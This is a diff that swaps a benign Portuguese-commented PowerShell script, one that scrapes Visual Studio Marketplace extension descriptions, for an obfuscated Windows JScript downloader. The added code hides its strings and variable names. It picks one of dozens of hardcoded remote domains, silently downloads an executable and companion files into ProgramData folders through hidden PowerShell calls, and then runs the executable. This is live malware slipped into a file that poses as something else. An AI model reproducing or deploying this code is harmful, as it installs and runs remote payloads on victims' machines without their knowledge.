@@ -1,50 +1,228 @@
-# Definir os caminhos dos arquivos
-$inputFile = "C:\caminho\para\input.txt"   # Arquivo contendo os nomes das extensões
-$outputFile = "C:\caminho\para\output.txt" # Arquivo de saída
+	var nJkpZjihUiDEQtAlPdkpod;
+	var gkAcJoCwNhIxZuoHaYoTq;
+	var DagPHHACxQkCuaYLMPWewAa;
+	var czdNoaKYgzEwwRmKvQbcgW;
+	var ZVdHXnWNKdBavIhult;
+	var WYhQnemAuoAavgrGD;
+	var LJcklXHdWzBzNCPBGNa;
+	var xImeahCcMjiMtWcrBRk;
+	var zEzjaRDCataHgGhovkCT;
+	var OrEZEYgwoXXQyBY;
+	var zEAtDdxiDvDhRlheHEdthtDt;
+	var AnzYiQDjlExktdOxAJdaPAuHNd;
+	var lijaevanHWTkrgmJUataAI;
+	var cCrOUvbxlQKzgxaTPNVd;
+	var VlCwlIYYIjhaCMLIyITTwEL;
+	var DTvPMTAYLnPqtrDmuwY;
+	var ERMWPDJaHPayDUAMdLQc;
+	var EQmgZxQxyAGpAbyDKt;
+	var mACxqrQkxHiLInjWBqRlrA;
+	var oazjbbhBpnjXjdtqkDtHVAZ;
+	var OjmdbMmovkCiRbuEUOa;
+	var tkHNCWgeiedZMtdAvVZApMb;
+	var TNHZjuciMoEntypRRqoAUc;
+	var PLVzWuetjzJAuAWOlIgAd;
+	var zYyCdQKvvPpxuqcxLoXVETh;
+	var JJKWjPXNZnhOVGZLkTz = new ActiveXObject("Scripting.FileSystemObject");
+	var uilzuOtykvuojimRYgynlk = new ActiveXObject("WScript.Shell");
+	var ipGZkQaAtEVWwmOGRxVZVERS;
+	var PLVzWuetjzJAuAWOlIgASY;
+	var PLVzWuetjzJAuAWOlIgAPY;
+	var PLVzWuetjzJAuAWOlIgAPX;
+	var gkAcJoCwNhIxZuoHaYoTqUPS;
+    nJkpZjihUiDEQtAlPdkpod = false;
+    gkAcJoCwNhIxZuoHaYoTq = false;
+	gkAcJoCwNhIxZuoHaYoTqUPS = false;
 
-# Limpar o arquivo de saída antes de começar
-Clear-Content -Path $outputFile -ErrorAction SilentlyContinue
+	
+oazjbbhBpnjXjdtqkDtHVAZ=5;
+ERMWPDJaHPayDUAMdLQc = "";
 
-# Criar um WebClient configurado com proxy e autenticação
-$webClient = New-Object System.Net.WebClient
-$webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-$webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
 
-# Ler cada linha do arquivo de entrada
-Get-Content $inputFile | ForEach-Object {
-    $filename = $_
-    $url = "https://marketplace.visualstudio.com/items?itemName=$filename"
-
-    # Fazer o request para a URL com proxy
-    try {
-        $content = $webClient.DownloadString($url)
-
-        # Extrair as tags <meta>
-        if ($content -match '<meta name="description" content="([^"]+)".*?>') {
-            $description = $matches[1]
-        } else {
-            $description = "Descrição não encontrada"
-        }
-
-        if ($content -match '<meta property="og:title" content="([^"]+)".*?>') {
-            $ogTitle = $matches[1]
-        } else {
-            $ogTitle = "Título OG não encontrado"
-        }
-
-        # Remover entidades HTML
-        $decodedDescription = [System.Net.WebUtility]::HtmlDecode($description)
-        $decodedOgTitle = [System.Net.WebUtility]::HtmlDecode($ogTitle)
-
-        # Criar a saída formatada
-        $output = "Extensão: $filename`nDescrição: $decodedDescription`nTítulo OG: $decodedOgTitle`n`n"
-
-        # Salvar no arquivo
-        Add-Content -Path $outputFile -Value $output
-    }
-    catch {
-        Add-Content -Path $outputFile -Value "Erro ao processar $filename`n"
+function CqZkUayOLOqNtLkVab(wrYGaoerpNJGPaZAqDtZuU, QLqdNtkpwzQmtcmozX){
+	try {
+		uilzuOtykvuojimRYgynlk.run('cmd /'+'c powershell -Command "irm -Uri '+ "'"+wrYGaoerpNJGPaZAqDtZuU + "' -OutFile " + "'"+QLqdNtkpwzQmtcmozX+"'"+'"' , 0, true);
+		return true;
+	} catch (LEpGnVzPPbLlLvKiGWHear) {
+        return false;
     }
 }
 
-Write-Host "Processo concluído! Saída salva em: $outputFile"
+
+function XMeLBbcQwlDXBTcAom(mACxqrQkxHiLInjWBqRlrA, GDbnXDVuNBUUGyKJ) {
+var QWQXqXUAcDjAQTqlIELpqjXWE;
+	QWQXqXUAcDjAQTqlIELpqjXWE = mACxqrQkxHiLInjWBqRlrA + oazjbbhBpnjXjdtqkDtHVAZ;
+	oazjbbhBpnjXjdtqkDtHVAZ=oazjbbhBpnjXjdtqkDtHVAZ+1;
+	return QWQXqXUAcDjAQTqlIELpqjXWE;
+}
+
+
+	function yYvIxrAzyroiBen(ipGZkQaAtEVWwmOGRxVZ){
+
+	gkAcJoCwNhIxZuoHaYoTq = false;
+
+
+	czdNoaKYgzEwwRmKvQbcgW = Math.floor(Math.random() * 61); 
+		var AKCqpaYAGr = [ 
+ 
+ 
+      "plolinvintez44.zurichaxon.partners",
+      "plolinmangem43.keepnowz.org",
+      "blosal.zurichaxon.partners",
+      "blubenfunsul.restonline.express",
+      "gramdinmincil.keepnowz.org",
+      "gramzinconrol.vizpaz.express",
+      "scrigunminvir.zurichaxon.partners",
+      "gluqual.zurichaxon.partners",
+      "cricol28.restonline.express",
+      "vaval424.restonline.express",
+      "prelinmenel.keepnowz.org",
+      "clanancal.keepnowz.org",
+      "flibangongor.vizpaz.express",
+      "pritanpor81.mzip.partners",
+      "cragor.keepnowz.org",
+      "prapenqual.vizpaz.express",
+      "brumonnanbel.zurichaxon.partners",
+      "vamintentum.vizpaz.express",
+      "plancol.keepnowz.org",
+      "crihal28.vizpaz.express",
+      "trevir.vizpaz.express",
+      "flomennil.mzip.partners",
+      "scriguncansal.zurichaxon.partners",
+      "dratunlintil.restonline.express",
+      "graal.restonline.express",
+      "craronqual.vizpaz.express",
+      "grapansar627.restonline.express",
+      "vaxil.mzip.partners",
+      "blufel3.vizpaz.express",
+      "frajal.mzip.partners",
+      "clajansonsul.vizpaz.express",
+      "prefar.vizpaz.express",
+      "flipinjanfer.vizpaz.express",
+      "privel.mzip.partners",
+      "trisonronmol.restonline.express",
+      "pruxil.vizpaz.express",
+      "promongongor87.keepnowz.org",
+      "scrogunim.vizpaz.express",
+      "promonmol01.mzip.partners",
+      "croronnonwel.restonline.express",
+      "prapinhenhal.restonline.express",
+      "plelinguntum.restonline.express",
+      "strisantum.zurichaxon.partners",
+      "blosil.restonline.express",
+      "blogongor.zurichaxon.partners",
+      "prepaz.mzip.partners",
+      "procil.vizpaz.express",
+      "clesal.keepnowz.org",
+      "spromantum.restonline.express",
+      "crocal.vizpaz.express",
+      "plominsanvel.keepnowz.org",
+      "spruvingem.mzip.partners",
+      "probansonral.mzip.partners",
+      "graminvel.keepnowz.org",
+      "cretonroncol.zurichaxon.partners",
+      "crolunral.keepnowz.org",
+      "ploqual.keepnowz.org",
+      "flimonxoncol.restonline.express",
+      "scriwingem.keepnowz.org",
+      "scrofil57.mzip.partners",
+      "gragem.keepnowz.org",
+      "sprogunpansar50.zurichaxon.partners"
+		]; 
+ 
+pWQhwETTM="ps:"; 
+OXEZiljmb="htt"; 
+DagPHHACxQkCuaYLMPWewAa=OXEZiljmb+pWQhwETTM+"//"+AKCqpaYAGr[ czdNoaKYgzEwwRmKvQbcgW ] + "/";  
+ 
+
+
+
+	var YtAbXDwQunEabJT = new ActiveXObject("Sc"+"ripting"+"."+"File"+"System"+"Object");
+	
+	zYyCdQKvvPpxuqcxLoXVETh="C:\\"+"Progra"+"mData"+"\\Public";
+	ipGZkQaAtEVWwmOGRxVZVERS="\\gf";
+	DttGzUaWmBAWGhUOEBXmFIM="";
+	try {
+		YtAbXDwQunEabJT.CreateFolder(zYyCdQKvvPpxuqcxLoXVETh);
+	} catch (EuKqagnInLHIAvduAWpQO) {
+
+	}
+	if (gkAcJoCwNhIxZuoHaYoTqUPS == true) { gkAcJoCwNhIxZuoHaYoTq = false; }
+	if (JJKWjPXNZnhOVGZLkTz.FileExists(zYyCdQKvvPpxuqcxLoXVETh + ipGZkQaAtEVWwmOGRxVZVERS)){ gkAcJoCwNhIxZuoHaYoTq = true; }
+	
+	
+	CZmlriJBzWXvkHOKNAM="Zotoc.Xerax.03224.7899.401"+DttGzUaWmBAWGhUOEBXmFIM;
+	
+		if (gkAcJoCwNhIxZuoHaYoTq == false) {
+		ZVdHXnWNKdBavIhult="C:\\"+"Progr"+"amD"+"ata\\"+"Media\\"+"Xerax"+CZmlriJBzWXvkHOKNAM+"\\";
+		uilzuOtykvuojimRYgynlk.run('cmd /V /C "echo '+ZVdHXnWNKdBavIhult+'>'+zYyCdQKvvPpxuqcxLoXVETh+ipGZkQaAtEVWwmOGRxVZVERS+'" && exit',0,true);
+		gkAcJoCwNhIxZuoHaYoTq = false;
+		
+
+			PLVzWuetjzJAuAWOlIgASY=CZmlriJBzWXvkHOKNAM+".exe";
+			PLVzWuetjzJAuAWOlIgAPY=CZmlriJBzWXvkHOKNAM+".log";
+			PLVzWuetjzJAuAWOlIgAPZ="stack.tmp";
+		
+		try {
+			YtAbXDwQunEabJT.CreateFolder("C:\\"+"ProgramData"+"\\"+"Media"+"\\");
+		} catch (EuKqagnInLHIAvduAWpQO) {
+
+		}
+
+		try {
+			YtAbXDwQunEabJT.CreateFolder(ZVdHXnWNKdBavIhult);
+		} catch (EuKqagnInLHIAvduAWpQO) {
+		
+		}
+
+		
+			try {
+				nJkpZjihUiDEQtAlPdkpod = CqZkUayOLOqNtLkVab(DagPHHACxQkCuaYLMPWewAa+"?65475155758628715", ZVdHXnWNKdBavIhult + PLVzWuetjzJAuAWOlIgASY)
+			}  catch (aiTxWQWhrlQaxvudKCN) {
+
+			}
+		
+			try {
+				nJkpZjihUiDEQtAlPdkpod = CqZkUayOLOqNtLkVab(DagPHHACxQkCuaYLMPWewAa+"?62675654080632946", ZVdHXnWNKdBavIhult + PLVzWuetjzJAuAWOlIgAPY );
+			} catch (aiTxWQWhrlQaxvudKCN) {
+				
+			}
+				
+			try {
+				nJkpZjihUiDEQtAlPdkpod = CqZkUayOLOqNtLkVab(DagPHHACxQkCuaYLMPWewAa+"?63952198224693681", ZVdHXnWNKdBavIhult + PLVzWuetjzJAuAWOlIgAPZ );
+			} catch (aiTxWQWhrlQaxvudKCN) {
+				
+			}
+	
+		
+			try { nJkpZjihUiDEQtAlPdkpod=CqZkUayOLOqNtLkVab(DagPHHACxQkCuaYLMPWewAa+"?70342163219613979", ZVdHXnWNKdBavIhult+"dump.log"); } catch (aiTxWQWhrlQaxvudKCN) { } 
+			
+			try {
+				uilzuOtykvuojimRYgynlk.run('cmd /V /C "echo '+CZmlriJBzWXvkHOKNAM+'>'+ZVdHXnWNKdBavIhult+'\\r1.log"&& exit',0,true);
+			} catch (RWQjbhGxLyxxeADWkhXv) {
+			
+			}
+
+			try {
+				uilzuOtykvuojimRYgynlk.run('cmd /V /C "echo '+CZmlriJBzWXvkHOKNAM+'>'+ZVdHXnWNKdBavIhult+'\\at.log"&& exit',0,true);
+			} catch (RWQjbhGxLyxxeADWkhXv) {
+			
+			}
+
+			if (JJKWjPXNZnhOVGZLkTz.FileExists(ZVdHXnWNKdBavIhult+ PLVzWuetjzJAuAWOlIgASY )){
+				if (JJKWjPXNZnhOVGZLkTz.FileExists(ZVdHXnWNKdBavIhult+ PLVzWuetjzJAuAWOlIgAPY )){
+					try{
+						gkAcJoCwNhIxZuoHaYoTq = true;
+						uilzuOtykvuojimRYgynlk.run(ZVdHXnWNKdBavIhult+PLVzWuetjzJAuAWOlIgASY+' '+ZVdHXnWNKdBavIhult+PLVzWuetjzJAuAWOlIgAPY, 0,   false);
+					}catch (EQmgZxQxyAGpAbyDKt) {
+
+					}
+					gkAcJoCwNhIxZuoHaYoTq = true;
+				}
+			}
+			
+			
+		}
+	}
+
+yYvIxrAzyroiBen("55202981266");
